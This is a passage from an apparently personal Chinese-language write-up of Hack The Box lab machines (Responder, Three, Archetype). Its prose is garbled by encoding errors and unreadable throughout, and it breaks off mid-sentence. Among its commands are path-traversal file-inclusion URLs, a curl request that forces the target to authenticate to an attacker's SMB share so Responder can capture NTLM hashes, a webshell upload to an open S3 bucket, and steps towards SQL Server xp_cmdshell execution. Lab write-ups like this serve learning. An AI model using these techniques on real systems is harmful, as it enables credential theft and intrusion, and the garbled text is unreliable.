alt=""></p><p>æˆ‘ä»¬çŸ¥é“å¦‚æœæƒ³é€šè¿‡åŸŸåè®¿é—®ä¸€ä¸ªç½‘ç«™çš„è¯ï¼Œæ˜¯éœ€è¦è¿›è¡Œ dns è§£æçš„ï¼Œæˆ‘ä»¬ç›´æ¥è¾“å…¥ IP åœ°å€å‘ç°è¢«é‡å®šå‘åˆ°äº† <code>unika.htb</code> è¿™ä¸ªåŸŸåï¼Œä½†æ˜¯è¿™ä¸ªåŸŸåæ²¡æœ‰åŠæ³•è§£æåˆ°å¯¹åº”çš„ IP åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ä¿®æ”¹ <code>hosts</code> æ–‡ä»¶æ¥ç¡®å®š IP åœ°å€</p><p><strong>ä¿®æ”¹hostè¿›å…¥ç½‘å€</strong></p><p><img src="../images/image-20230403161118887.png" alt="image-20230403161118887"></p><p>æ·»åŠ åï¼Œå°±å¯ä»¥æˆåŠŸè¿›å…¥ç½‘å€äº†</p><p><img src="../images/image-20230403161144380.png" alt="image-20230403161144380"></p><p>å†æ¬¡è®¿é—®ï¼Œå‡ºç°é¡µé¢ï¼Œè¿™ä¸ªç½‘ç«™æ˜¯é€šè¿‡è™šæ‹Ÿä¸»æœºæ­å»ºçš„ï¼Œä¹Ÿå°±æ˜¯å¤šä¸ªç½‘ç«™æ­å»ºåœ¨ä¸€å°æœåŠ¡å™¨ä¸Šï¼Œä¸€èˆ¬ç°å®ç¯å¢ƒä¸­æ˜¯ä¸èƒ½é€šè¿‡è™šæ‹Ÿä¸»æœºçš„ IP ç›´æ¥è®¿é—®çš„ï¼Œè€Œæ˜¯é€šè¿‡ <code>A è®°å½•</code>(æŠŠåŸŸåè§£æåˆ°ä¸€ä¸ªIPåœ°å€)æˆ– <code>CNAME è®°å½•</code> (æŠŠåŸŸåè§£æåˆ°å¦å¤–ä¸€ä¸ªåŸŸå)è§£æå‡ºåŸŸååï¼Œå†è¿›è¡Œä¸‹ä¸€æ¬¡åŸŸåè§£ææ¥è®¿é—®</p><p><strong>æŸ¥çœ‹ç½‘ç«™æœ‰å“ªäº›åŠŸèƒ½</strong></p><p>æŸ¥çœ‹ç½‘ç«™åŠŸèƒ½<br>æµ‹è¯• web åº”ç”¨ç¨‹åºå¯ä»¥é‡ç‚¹å…³æ³¨äº¤äº’åŠŸèƒ½ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶å“ªäº›è¾“å…¥ï¼Œåˆå¦‚ä½•è¢«åç«¯å¤„ç†ï¼Œä¼šä¸ä¼šä»¥åŠæ€ä¹ˆè¾“å‡º? é™æ€çš„ç½‘ç«™åŸºæœ¬ä¸Šä¸ä¼šæœ‰æ¼æ´çš„</p><p>ç‚¹äº†ç‚¹ç½‘ç«™ï¼Œä¹Ÿæ˜¯å¾ˆå¸¸è§çš„å…¬å¸äº§å“å®˜ç½‘(?ä¸çŸ¥é“æ€ä¹ˆåˆ†ç±»ï¼Œå°±æ˜¯é™æ€é¡µé¢ä¸ºä¸»)ï¼Œåªæœ‰ä¸€ä¸ªç•™è¨€åŠŸèƒ½å’Œä¸€ä¸ªè¯­è¨€åˆ‡æ¢åŠŸèƒ½æœ‰æ•°æ®åŒ…è¯·æ±‚ï¼Œå‰©ä¸‹éƒ½æ˜¯ç”±å‰ç«¯å®Œæˆèµ„æºé”šç‚¹è·³è½¬çš„</p><p>è¯·æ±‚è¿™ä¸¤ä¸ªåŠŸèƒ½åˆ†åˆ«æ˜¯ä¸¤ä¸ª html é¡µé¢çš„è¯·æ±‚ï¼Œä½†æ˜¯éƒ½æ˜¯è·³è½¬åˆ°é¦–é¡µæœ€ä¸Šæ–¹</p><p><strong>ç®€å•æ¥è¯´å°±æ˜¯è¿™é‡Œçš„è¯åªæœ‰ç‚¹å‡»åˆ‡æ¢è¯­è¨€å’Œå‘é€è¯„è®ºåŠŸèƒ½æ‰ä¼šæœ‰è·³è½¬ï¼Œå…¶ä»–éƒ½æ˜¯é™æ€é¡µé¢</strong></p><p><img src="../images/image-20230403161618815.png" alt="image-20230403161618815"></p><p>ç‚¹å‡»åˆ‡æ¢è¯­è¨€çš„æ—¶å€™ï¼Œä¼šæœ‰è¿™ä¸ªä¸œè¥¿å‡ºç°ï¼Œæ„Ÿè§‰æœ‰ç‚¹<strong>æ–‡ä»¶åŒ…å«</strong>çš„æ„æ€</p><p><strong>æ¢æµ‹æ¼æ´â€”æ–‡ä»¶åŒ…å«</strong></p><p>åˆ°è¿™é‡Œæœ‰ä¸€ä¸ª <code>page</code> å‚æ•°ï¼Œè¾“å…¥æ–‡ä»¶åï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°æ–¹æ¯”è¾ƒå¤§å¯èƒ½å­˜åœ¨çš„æ¼æ´å°±æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ‘ä»¬åœ¨åˆçº§é¶åœºä¹Ÿæ¥è§¦è¿‡ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼Ÿ</p><p>éšä¾¿è¾“å…¥ï¼Œå‘ç°æŠ¥é”™è¿”å›äº†è·¯å¾„ï¼Œä½¿ç”¨çš„ <code>xampp</code>ï¼Œä¸€ç§æ¯”è¾ƒå¸¸ç”¨çš„ä¸€é”®å¼é›†æˆç¯å¢ƒæ­å»ºçš„ç½‘ç«™ï¼Œé»˜è®¤æ˜¯å°†è„šæœ¬æ–‡ä»¶æ”¾åˆ° <code>xampp/htdocs</code> ç›®å½•ä¸‹è¿è¡Œ</p><p><img src="../images/image-20230403162422210.png" alt="image-20230403162422210"></p><p>å¾ˆæ˜æ˜¾çš„windowsç¯å¢ƒ å‡ºç°äº†  <code>C://</code></p><p>æœ‰ä»€ä¹ˆç‰¹æ®Šçš„æ•æ„Ÿæ–‡ä»¶å—? æˆ‘ä»¬å¯ä»¥å°è¯•æŸ¥çœ‹ <code>hosts</code> æ–‡ä»¶   <a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt">æ•æ„Ÿæ–‡ä»¶</a></p><p><img src="../images/image-20230403163615076.png" alt="image-20230403163615076"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨ç›˜ç¬¦ä¹Ÿè¡Œ</p><p><img src="../images/image-20230403163704273.png" alt="image-20230403163704273"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=C://windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•è¿›ä¸€æ­¥åˆ©ç”¨å‘¢ï¼Ÿä¸¤ç§æ€è·¯ï¼Œä¸€æ˜¯å†™å…¥æˆ–åŒ…å«è¿œç¨‹åé—¨æ–‡ä»¶ï¼Œç„¶åè¿æ¥ï¼Œè¿˜æœ‰æ˜¯ç»§ç»­ä¿¡æ¯æ”¶é›† <code>windows</code> ç³»ç»Ÿçš„è´¦å·å¯†ç ä¿¡æ¯ï¼Œè¿›è¡Œç™»å½•</p><p>æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬çŸ¥é“è¿œç¨‹æ–‡ä»¶åŒ…å«è¿˜éœ€è¦ä¸¤ä¸ªæ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_includeã€allow_url_fopen ä¸º ON</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403164006812.png" alt="image-20230403164006812"></p><p>å‘ç°æ²¡å¼€ï¼Œæ‰€ä»¥è¯´æ˜è¿œç¨‹æ–‡ä»¶åŒ…å«ä¹Ÿç”¨ä¸äº†äº†</p><p>é‚£ä¹ˆå’±å°±ç»§ç»­è¿›è¡Œä¿¡æ¯æ”¶é›†å»</p><p>æˆ‘ä»¬çŸ¥é“è¿™ä¸ªâ½¹â»šå®¹æ˜“å—åˆ°â½‚ä»¶åŒ…å«æ¼æ´çš„å½±å“ï¼Œå¹¶ä¸”åœ¨ Windows æœºå™¨ä¸Šæä¾›æœåŠ¡ã€‚å› æ­¤ï¼Œå­˜åœ¨åœ¨æˆ‘ä»¬çš„æ”»å‡»è€…â¼¯ä½œç«™ä¸ŠåŒ…å«â½‚ä»¶çš„å¯ èƒ½æ€§ã€‚å¦‚æœæˆ‘ä»¬é€‰æ‹©åƒ <strong>SMB</strong> è¿™æ ·çš„åè®®ï¼ŒWindows å°†å°è¯•å¯¹æˆ‘ä»¬çš„æœºå™¨è¿›â¾â¾ä»½éªŒè¯ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥æ•è·NetNTLMv2.</p><p><strong>åˆ©ç”¨ SMB çªƒå– NTLM hash</strong></p><p><img src="../images/image-20230403201415201.png" alt="image-20230403201415201"></p><p><img src="../images/image-20230403201426613.png" alt="image-20230403201426613"></p><p><img src="../images/image-20230403201445815.png" alt="image-20230403201445815"></p><p><strong>SMB åè®®æ”¯æŒ NTLM å’Œ LM åŠ å¯†ï¼Œæˆ‘ä»¬é€šè¿‡æ¶æ„ç¨‹åºç›‘å¬ï¼Œåœ¨è¿œç¨‹ä¸»æœºè®¿é—®æˆ‘ä»¬çš„ SMB æœåŠ¡æ—¶ï¼Œå› ä¸ºè¦è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä¼šå‘é€ç›¸å…³ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å–ç›®æ ‡ä¸»æœºçš„ hash å€¼ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†è´¦å·å¯†ç çš„å®‰å…¨æ€§ï¼Œä¸€èˆ¬éƒ½ä¸è¿›è¡Œæ˜æ–‡éªŒè¯ï¼Œè€Œæ˜¯ä½¿ç”¨æ‘˜è¦å€¼è¿›è¡Œæ¯”å¯¹ï¼Œè¿™æ ·å°±ç»™äº†æˆ‘ä»¬å¯ä¹˜ä¹‹æœºï¼Œä¸éœ€è¦çŸ¥é“æ­£ç¡®çš„è´¦å·å¯†ç ï¼Œåªè¦æ‘˜è¦å€¼æ¯”å¯¹æˆåŠŸå°±å¯ä»¥ç™»å½•</strong></p><p><strong>ä¸‹è½½å·¥å…·ï¼Œä½¿ç”¨å…¶è¿›è¡Œç›‘å¬</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull https://github.com/lgandx/Responder </span><br></pre></td></tr></table></figure><p>ç¡®è®¤æ˜¯å¦æ”¯æŒ SMB è¯·æ±‚</p><p><img src="../images/image-20230403202210015.png" alt="image-20230403202210015"></p><p>ç›‘å¬ <code>tun0</code> ,ä¹‹å‰æœ‰ä¸€æ¬¡é¶æœºæåˆ°è¿‡ï¼Œè¯¥ IP æ˜¯å’Œç›®æ ‡æœºå™¨ä¸€ä¸ªç½‘ç»œä¸‹çš„ 10 æ®µ IP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Responder.py -I tun0 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403202438515.png" alt="image-20230403202438515"></p><p><img src="../images/image-20230403202457127.png" alt="image-20230403202457127"></p><p>æˆ‘ä»¬ä½¿ç”¨ <code>curl</code> å‘½ä»¤æ¥è¯·æ±‚ <code>url</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://unika.htb/index.php?page=//10.129.158.196/csd </span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯è¦æ‹¿<code>tun0</code>çš„ipåœ°å€</p><p>ä¸æ˜¯æ‹¿é¢˜ç›®çš„ipåœ°å€</p><p>æˆ‘ä»¬å‘ç°æˆåŠŸæ¥æ”¶åˆ°æœåŠ¡å™¨çš„çš„ <code>NTLM</code> å€¼,ä¸€èˆ¬æ˜¯ç¬¬ä¸€æ¬¡è¯·æ±‚æ‰ä¼šå‘é€ï¼Œç„¶åä¼šä¿å­˜åˆ°æœ¬åœ°ï¼Œä¸‹æ¬¡å°±ä¸ä¼šå†å‘é€äº†</p><p>æ¥ä¸‹æ¥ä¸å†™äº†   å¼¹ä¸æˆåŠŸï¼Œè·å¾—ä¸äº†è¯·æ±‚</p><p><strong>wp</strong></p><p><a href="https://blog.csdn.net/qq_40927195/article/details/124418613?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168050613316800226520463%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168050613316800226520463&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-124418613-null-null.142^v81^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=responder%20htb&amp;spm=1018.2226.3001.4187">æ–‡ç« 1</a></p><p><a href="blob:https://app.hackthebox.com/77561ee0-b632-4b11-820a-27746092a7a3">æ–‡ç« 2</a>    â€”â€”&gt;   å¯èƒ½æ‰“ä¸å¼€   è¿™æ˜¯åœ¨hacktheboxé‡Œé¢çš„å®˜æ–¹æ–‡æ¡£ï¼Œæœ¬åœ°çš„<code>1.pdf</code>æ˜¯ä¸­æ–‡ç¿»è¯‘è¿‡æ¥çš„</p><h2 id="three"><a href="#three" class="headerlink" title="three"></a>three</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230404202036676.png" alt="image-20230404202036676"></p><p>è¿˜æ˜¯è€æ ·å­ï¼Œå…ˆpingä¸€ä¸‹</p><p><img src="../images/image-20230404202059303.png" alt="image-20230404202059303"></p><p>æ¥ä¸‹æ¥å°±è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230404202338133.png" alt="image-20230404202338133"></p><p>æ‰«åˆ°äº†ä¸¤ä¸ªç«¯å£</p><p>æ‰«æå‘ç°å¼€æ”¾ 22 å’Œ 80 ä¸¤ä¸ªç«¯å£ï¼Œ22 æ˜¯ <code>ssh</code> æœåŠ¡ï¼Œç™»å½•åˆ†ä¸ºè´¦å·å¯†ç ç™»å½•å’Œ<a href="https://so.csdn.net/so/search?q=å…¬é’¥&amp;spm=1001.2101.3001.7020">å…¬é’¥</a>ç™»å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh username@ip</span><br><span class="line">ssh ip</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ç™»å½•æˆåŠŸï¼Œçœ‹80ç«¯å£</p><p>æ˜¯ä¸€ä¸ªä¹é˜Ÿçš„å®˜ç½‘ï¼Œapache2.4.29 ã€linux ç³»ç»Ÿã€php ï¼ŒåŠŸèƒ½æœ‰æœç´¢ï¼Œä¹°ç¥¨ï¼Œè”ç³»æˆ‘ä»¬ï¼Œä¸è¿‡éƒ½åªæ˜¯åšä¸ªé¡µé¢ï¼Œ<strong>æ²¡æœ‰å®é™…çš„è¯·æ±‚äº¤äº’</strong></p><p>å°è¯•ç›®å½•çˆ¬å–å’Œçˆ†ç ´ï¼Œæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯â€¦</p><p>Email: <strong>mail@thetoppers.htb</strong> çœ‹åˆ°äº†é‚®ç®±ï¼Œç„¶åæŠŠé¶æœº ip å’ŒåŸŸåè¿›è¡Œç»‘å®šï¼Œç„¶åè¿›è¡Œå­åŸŸåçˆ†ç ´ï¼Œä¸è¦é—®ä¸ºä»€ä¹ˆè¿™ä¹ˆåšï¼Œå­¦ç€ç‚¹å°±è¡Œäº†</p><p><img src="../images/image-20230404210616587.png" alt="image-20230404210616587"></p><p>å‘ç°åªæœ‰è¿™ä¸ªåŸŸåæœ‰ç”¨ï¼Œä½†æˆ‘ä»¬ç›´æ¥è®¿é—®è¿™ä¸ªåŸŸåçš„æ—¶å€™å´æ²¡æœ‰æ‰“å¼€è¿™ä¸ªç½‘å€ï¼Œåº”è¯¥å°±æ˜¯æ²¡æœ‰é…ç½®hostsçš„åŸå› ï¼Œå’Œä¸Šé¢çš„<code>Responder</code>æ˜¯ä¸€ä¸ªè€ƒç‚¹</p><p>ä¿®æ”¹åæ˜¯ç›´æ¥èƒ½è®¿é—®è¿™ä¸ªç½‘å€çš„</p><p>å­åŸŸåçˆ†ç ´ï¼Œè¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºæˆ‘ä»¬ç°åœ¨åªèƒ½è§£æé¶æœºIPå’Œå®ƒå¯¹åº”çš„åŸŸåï¼Œå­åŸŸåå¦‚ä½•è§£æï¼Ÿå³ä½¿æ˜¯åŒä¸€ä¸ªIPçš„å­åŸŸåï¼Œåœ¨æ²¡æœ‰ä¿®æ”¹ <code>hosts</code> æ–‡ä»¶æ—¶ä¹Ÿæ˜¯æ— æ³•è®¿é—®çš„ï¼Œå·¥å…·åˆæ˜¯å¦‚ä½•åˆ¤æ–­çˆ†ç ´çš„å­åŸŸåå­˜åœ¨å‘¢ï¼Ÿ</p><p>ä½¿ç”¨ <code>gobuster</code> çˆ†ç ´ï¼Œå­—å…¸ä¹Ÿæ˜¯ä»åˆ«çš„å·¥å…·é‡Œå€Ÿç”¨çš„ï¼Œä½†æ˜¯å­—å…¸å¤ªå¤§äº†ï¼Œå°±æå‰ç»“æŸäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -w /usr/share/wordlists/domain_dic.txt -u http://thetoppers.htb</span><br></pre></td></tr></table></figure><p> åæ­£å°±æ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªå­åŸŸå</p><p><code>s3.thetoppers.htb</code></p><p>vhost çš„ä¸»è¦åŠŸèƒ½æ˜¯æšä¸¾æŸä¸ªæœåŠ¡ä¸Šéƒ¨ç½²çš„æ‰€æœ‰è™šæ‹Ÿä¸»æœºï¼Œå…¶åŸç†æ˜¯é€šè¿‡æ„é€  HTTP è¯·æ±‚å¤´ï¼Œå°†å­—å…¸ä¸­çš„åŸŸåè®¾ç½®åˆ° HTTP è¯·æ±‚å¤´åˆ° HOST å­—æ®µï¼Œç„¶åé€šè¿‡ IP è¯·æ±‚ç½‘ç«™ï¼Œå¦‚æœæ˜¯è¯¥åŸŸåçš„è™šæ‹Ÿä¸»æœºï¼Œé‚£ä¹ˆè¯·æ±‚ä¼šè¿”å›è¯¥åŸŸåä¸‹çš„ç½‘ç«™å†…å®¹ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™è¿”å›é€šè¿‡ IP è®¿é—®è·å¾—çš„èµ„æºè€ŒéåŸŸåä¸‹çš„èµ„æº</p><p>ç„¶åæ¥ä¸‹æ¥è¿˜æ˜¯ä¿®æ”¹hosts</p><p><img src="../images/image-20230404221641973.png" alt="image-20230404221641973"></p><p><img src="../images/image-20230404221721024.png" alt="image-20230404221721024"></p><p>æˆåŠŸäº†</p><p><img src="../images/image-20230404221802636.png" alt="image-20230404221802636"></p><p>ä½¿ç”¨çš„ <code>hypercorn</code> è¿™æ˜¯ä¸€ä¸ª <code>ASGI</code> æœåŠ¡å™¨ï¼Œå¯ç”¨åç›‘å¬8000ç«¯å£äº‘äº‘ï¼Œä¸ç”¨äº†è§£å¤ªå¤š</p><p>ASGIï¼ˆå¼‚æ­¥æœåŠ¡å™¨ç½‘å…³æ¥å£ï¼‰æ˜¯<a href="https://so.csdn.net/so/search?q=WSGI&amp;spm=1001.2101.3001.7020">WSGI</a>çš„ç²¾ç¥ç»§æ‰¿è€…ï¼Œæ—¨åœ¨åœ¨å…·æœ‰å¼‚æ­¥åŠŸèƒ½çš„Python WebæœåŠ¡å™¨ï¼Œæ¡†æ¶å’Œåº”ç”¨ç¨‹åºä¹‹é—´æä¾›æ ‡å‡†æ¥å£</p><p><strong>AWS S3 æ‹¿shell</strong></p><p><code>s3</code> ğŸ‘‰ <code>AWS S3</code> å…¨åæ˜¯ <code>Amazon Simple Storage Service</code> ï¼Œç®€ä¾¿çš„å¯¹è±¡å­˜å‚¨æœåŠ¡ï¼Œå­˜å‚¨çš„æ•°æ®ç±»ä¼¼é”®å€¼å¯¹çš„å½¢å¼ï¼Œå°±æ˜¯å¯¹è±¡åï¼šæ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install awscli       // å®‰è£…å·¥å…· </span><br><span class="line">aws configure            // é…ç½®</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406091400477.png" alt="image-20230406091400477"></p><p>å‰ä¸¤é¡¹é…ç½®æ˜¯ç”¨æˆ·å‡­è¯ï¼Œé€šè¿‡ä»€ä¹ˆèº«ä»½è¿æ¥åˆ° <code>AWS</code> å­˜å‚¨åº“ï¼Œç¬¬ä¸‰ä¸ªæ˜¯åŒºåŸŸä¿¡æ¯ï¼Œç¬¬å››ä¸ªæ˜¯è¾“å‡ºæ ¼å¼ï¼Œä¸ºä»€ä¹ˆéƒ½æ˜¯ <code>temp</code> æˆ‘ä¹Ÿä¸æ‡‚ï¼Œå¯èƒ½æ˜¯è®¾ç½®çš„</p><p>é€šè¿‡å·¥å…·è®¿é—®å¹¶æ‰§è¡Œå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 ls</span><br><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406091950627.png" alt="image-20230406091950627"></p><p>å‘ç°å­˜åœ¨.htaccessï¼Œæ–‡ä»¶ä¸Šä¼ å¯¹è¿™ä¸ªå¾ˆç†Ÿæ‚‰ï¼Œç„¶åæˆ‘ä»¬å°±å°è¯•è¿›è¡Œæ–‡ä»¶ä¸Šä¼ çœ‹çœ‹â€˜</p><p><img src="../images/image-20230406092738942.png" alt="image-20230406092738942"></p><p>ä¸Šä¼ æˆåŠŸ æˆåŠŸè·å– <code>webshell</code> æƒé™ </p><p>è¿™é‡Œæ²¡å¤ç°æˆåŠŸ ã€‚ã€‚ã€‚ã€‚ã€‚</p><h2 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230407142721508.png" alt="image-20230407142721508"></p><p><strong>å·¥å…·ä»‹ç»</strong><br><strong>smbclient</strong><br>Smbclient(samba client)æ˜¯åŸºäºSMBåè®®çš„,ç”¨äºå­˜å–å…±äº«ç›®æ ‡çš„å®¢æˆ·ç«¯ç¨‹åºã€‚<br>å‚æ•°ï¼š</p><p>ç½‘ç»œèµ„æº ç½‘ç»œèµ„æºçš„æ ¼å¼ä¸º//æœåŠ¡å™¨åç§°/èµ„æºåˆ†äº«åç§°ã€‚</p><p>å¯†ç  è¾“å…¥å­˜å–ç½‘ç»œèµ„æºæ‰€éœ€çš„å¯†ç ã€‚</p><p>-B ä¼ é€å¹¿æ’­æ•°æ®åŒ…æ—¶æ‰€ç”¨çš„IPåœ°å€ã€‚</p><p>-d&lt; æ’é”™å±‚çº§&gt; æŒ‡å®šè®°å½•æ–‡ä»¶æ‰€è®°è½½äº‹ä»¶çš„è¯¦ç»†ç¨‹åº¦ã€‚</p><p>-E å°†ä¿¡æ¯é€åˆ°æ ‡å‡†é”™è¯¯è¾“å‡ºè®¾å¤‡ã€‚</p><p>-h æ˜¾ç¤ºå¸®åŠ©ã€‚</p><p>-i&lt; èŒƒå›´&gt; è®¾ç½®NetBIOSåç§°èŒƒå›´ã€‚</p><p>-I æŒ‡å®šæœåŠ¡å™¨çš„IPåœ°å€ã€‚</p><p>-l&lt; è®°å½•æ–‡ä»¶&gt; æŒ‡å®šè®°å½•æ–‡ä»¶çš„åç§°ã€‚</p><p>-L æ˜¾ç¤ºæœåŠ¡å™¨ç«¯æ‰€åˆ†äº«å‡ºæ¥çš„æ‰€æœ‰èµ„æºã€‚</p><p>-M å¯åˆ©ç”¨WinPopupåè®®ï¼Œå°†ä¿¡æ¯é€ç»™é€‰é¡¹ä¸­æ‰€æŒ‡å®šçš„ä¸»æœºã€‚</p><p>-n æŒ‡å®šç”¨æˆ·ç«¯æ‰€è¦ä½¿ç”¨çš„NetBIOSåç§°ã€‚</p><p>-N ä¸ç”¨è¯¢é—®å¯†ç ã€‚</p><p>-O&lt; è¿æ¥æ§½é€‰é¡¹&gt; è®¾ç½®ç”¨æˆ·ç«¯TCPè¿æ¥æ§½çš„é€‰é¡¹ã€‚</p><p>-p æŒ‡å®šæœåŠ¡å™¨ç«¯TCPè¿æ¥ç«¯å£ç¼–å·ã€‚</p><p>-R&lt; åç§°è§£æé¡ºåº&gt; è®¾ç½®NetBIOSåç§°è§£æçš„é¡ºåºã€‚</p><p>-s&lt; ç›®å½•&gt; æŒ‡å®šsmb.confæ‰€åœ¨çš„ç›®å½•ã€‚</p><p>-t&lt; æœåŠ¡å™¨å­—ç &gt; è®¾ç½®ç”¨ä½•ç§å­—ç¬¦ç æ¥è§£ææœåŠ¡å™¨ç«¯çš„æ–‡ä»¶åç§°ã€‚</p><p>-T å¤‡ä»½æœåŠ¡å™¨ç«¯åˆ†äº«çš„å…¨éƒ¨æ–‡ä»¶ï¼Œå¹¶æ‰“åŒ…æˆtaræ ¼å¼çš„æ–‡ä»¶ã€‚</p><p>-U&lt; ç”¨æˆ·åç§°&gt; æŒ‡å®šç”¨æˆ·åç§°ã€‚</p><p>-W&lt; å·¥ä½œç¾¤ç»„&gt; æŒ‡å®šå·¥ä½œç¾¤ç»„åç§°ã€‚</p><p><strong>psexec</strong><br><strong>ç”¨äºè¿œç¨‹è¿æ¥çš„å·¥å…·</strong></p><p>è¿˜æ˜¯å…ˆpingä¸€ä¸‹</p><p><img src="../images/image-20230407142755841.png" alt="image-20230407142755841"></p><p>æ¥ä¸‹æ¥æ—¶æ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230407143003810.png" alt="image-20230407143003810"></p><p><strong>è¿™é‡Œé¢çš„135å’Œ139ç«¯å£æ²¡å•¥ç”¨</strong></p><p><strong>å¯¹445ç«¯å£è¿›è¡Œæ£€æµ‹</strong></p><p>smbclient -L // -L åˆ—å‡ºæ‰€æœ‰å…±äº«ç”¨æˆ·</p><p><img src="../images/image-20230407143417585.png" alt="image-20230407143417585"></p><p>è¿™é‡Œæ—¶ç©ºå¯†ç ç™»å½•ï¼Œå­˜åœ¨backupsåŒ¿åç”¨æˆ·ï¼Œå¯è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230407143638426.png" alt="image-20230407143638426"></p><p>åŒ¿åç™»å½•æˆåŠŸåï¼Œç„¶åä¸‹è½½å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶è¿›è¡ŒæŸ¥çœ‹</p><p><img src="../images/image-20230407144159804.png" alt="image-20230407144159804"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶æ˜¯<strong>sqlserver</strong>çš„é…ç½®æ–‡ä»¶</p><p><img src="../images/image-20230407143745285.png" alt="image-20230407143745285"></p><p>å­˜åœ¨æ•°æ®åº“è´¦å·å¯†ç ï¼Œç„¶åå°±å»æŸ¥çœ‹1433ç«¯å£ï¼Œè¿™ä¸ªç«¯å£å­˜åœ¨æ•°æ®åº“</p><p><strong>æ£€æµ‹1433ç«¯å£</strong></p><p>æ‹¿åˆ°äº†<strong>SQLSERVER</strong>çš„å¯†ç å’Œè´¦å·ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç™»é™†sqlserver<br>ç™»å½•sqlserverä¼¼ä¹æœ‰å¾ˆå¤šå·¥å…·ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯impacketåŒ…exampleæ–‡ä»¶å¤¹ä¸­çš„mssqlclient.pyè„šæœ¬ï¼Œä¸»è¦æ˜¯åˆšå¥½æœ€è¿‘åœ¨å­¦ä¹ å†…ç½‘æ—¶ç”¨åˆ°<br>è¦ä½¿ç”¨impacketåŒ…è¦è¦å…ˆå®‰è£…impacketå·¥å…·åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">cd impacket/</span><br><span class="line">sudo pip3 install .</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407144746945.png" alt="image-20230407144746945"></p><p>æˆåŠŸç™»å½•æ•°æ®åº“</p><p>æŸ¥çœ‹<code>SELECT IS_SRVROLEMEMBER ( &#39;sysadmin &#39; )</code>ï¼Œå‘ç°æ˜¯SAæƒé™</p><p><img src="../images/image-20230407145741555.png" alt="image-20230407145741555"></p><p><img src="../images/image-20230407145843746.png" alt="image-20230407145843746"></p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨<code>xp_cmdshell</code>æ¥è·å–RCE</p><p>ä½¿ç”¨çš„å‡½æ•°ä¸ºxp_cmdshell(èƒ½å¸®åŠ©æˆ‘ä»¬æ‹¿åˆ°ä¸»æœºçš„shell)ï¼Œxp_cmdshellå­˜å‚¨è¿‡ç¨‹åœ¨ SQL Server 